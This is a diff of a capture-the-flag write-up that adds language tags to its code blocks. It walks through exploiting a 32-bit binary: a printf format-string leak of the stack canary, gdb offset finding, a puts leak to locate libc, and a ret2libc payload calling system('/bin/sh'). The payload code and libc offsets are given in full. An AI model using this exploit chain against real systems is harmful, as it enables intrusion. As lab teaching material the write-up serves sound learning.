@@ -3,7 +3,7 @@
 
 From the source code, we know the number is calculated with ``rand`` address.
 
-```
+```python
 (rand % 4096) + 1
 ```
 
@@ -13,13 +13,13 @@ The address might change when the program starts everytime, so we could search t
 
 Run ``radare2`` to disassemble the program
 
-```
+```bash
  r2 ./vuln
 ```
 
 Execute ``pd $s > vuln.asm`` in r2, exam output *vuln.asm*, the canary is loaded from ``gs:[0x14]``, which stored a random generated number, into ``[ebp-0xc]``. Before the function returns, the canary is checked and call ``__stack_chk_fail_local`` on failed. The canary changes everytime the program start running, but the location on stack is fixed, so we need to find the canary address.
 
-```
+```asm
 0x08048783      65a114000000   mov eax, dword gs:[0x14]
 0x08048789      8945f4         mov dword [ebp - 0xc], eax
 0x0804878c      31c0           xor eax, eax
@@ -37,7 +37,7 @@ Execute ``pd $s > vuln.asm`` in r2, exam output *vuln.asm*, the canary is loaded
 
 The winner name buffer allow us to input something, use the ``printf`` format string to print positional parameters, '%N$lx' for the Nth parameter.
 
-```
+```python
 num = None
 for i in range(1, 200):
     if num is None:
@@ -51,7 +51,7 @@ for i in range(1, 200):
 
 In the output, several lines suspicious, like 20th, 119th and 166th.
 
-```
+```bash
 ...
 18 b'Congrats: XXX 0\n'
 19 b'Congrats: XXX 1\n'
@@ -75,13 +75,13 @@ In the output, several lines suspicious, like 20th, 119th and 166th.
 
 Run the program from gdb, set a breakpoint at *0x080487e9*, where to load the prestored canary value into *eax*.
 
-```
+```bash
 pwndbg> b *0x080487e9
 Breakpoint 1 at 0x80487e9
 ```
 By checking the suspicious lines, the 119th looks like what we are looking for.
 
-```
+```bash
 What number would you like to guess?
 -2815
 Congrats! You win! Your prize is this print statement!
@@ -93,7 +93,7 @@ Congrats: 9ef1d800
 
 Execute one step forward and check the value in *eax*. which means the value at 119th indeed is the canary value. 
 
-```
+```bash
 pwndbg> si
 0x080487ec in win ()
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
@@ -128,7 +128,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 We need to find EIP address to figure out how many padding do we need.
 Run the program in ``gdb``, set a breakpoint at *leave* instruction in ``win``, feed it 100 'A'.
 
-```
+```bash
 pwndbg> b *0x080487fd
 Breakpoint 1 at 0x80487fd
 pwndbg> r
@@ -147,7 +147,7 @@ Name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 Now it breaks, check the first 32 words at the top of the stack. The *0x41414141* block starts at *0xffce1d7c*, so we know this is where the buffer starts.
 
-```
+```bash
 pwndbg> x/32wx $esp
 0xffce1d70:     0x00000001      0xfffff501      0xfffff501      0x41414141
 0xffce1d80:     0x41414141      0x41414141      0x41414141      0x41414141
@@ -161,7 +161,7 @@ pwndbg> x/32wx $esp
 
 Use ``info frame`` to find out where EIP is. *eip at 0xffce1f8c* in *saved registers* section tell us exactly what we are looking for.
 
-```
+```bash
 pwndbg> info frame
 Stack level 0, frame at 0xffce1f90:
  eip = 0x80487fd in win; saved eip = 0x804888c
@@ -174,7 +174,7 @@ Stack level 0, frame at 0xffce1f90:
 
 By calculating the distance between EIP address and buffer address we know the padding is *528*. The buffer size is 512 bytes and canary is 4 bytes, so we need another 12 bytes of padding before EIP.
 
-```
+```bash
 pwndbg> p/d 0xffce1f8c-0xffce1d7c 
 $1 = 528
 ```
@@ -190,7 +190,7 @@ Now we need to call ``puts`` to print the address of itself, the payload would b
 
 Find address of ``puts`` on server by running the script. 
 
-```
+```python
 elf = pwn.ELF(target, False)
 payload = b'A' * 512 + pwn.p32(canary) + b'B'*12
 payload += pwn.p32(elf.plt['puts'])
@@ -205,14 +205,14 @@ puts_addr = pwn.u32(pr.readline()[:4])
 
 With the address we found matches using website [libc database search](https://libc.blukat.me/?q=puts%3A0xf7dab3d0&l=libc6-i386_2.27-3ubuntu1.2_amd64)
 
-```
+```html
 Matches
 libc6-i386_2.27-3ubuntu1.2_amd64
 ```
 
 Find ``system`` offset and `str_bin_sh` offset from [libc6-i386_2.27-3ubuntu1.2_amd64](https://libc.blukat.me/d/libc6-i386_2.27-3ubuntu1.2_amd64.symbols). Then the addresses could be calculated.
 
-```
+```python
 libc_base = puts_addr - 0x673d0
 sys_addr = libc_base + 0x3cd80
 binsh_addr = libc_base + 0x17bb8f
@@ -225,10 +225,11 @@ The payload follow format
 
 ```padding(512bytes) + canary + padding(12bytes) + system address + win address + string bin sh address```
 
-```
+```python
 payload = b'A' * 512 + pwn.p32(canary) + b'B'*12
 payload += pwn.p32(sys_addr)
 payload += pwn.p32(elf.sym['win'])
 payload += pwn.p32(binsh_addr)
 ```
+
 Finally, combine them all to get shell and get the flag. 
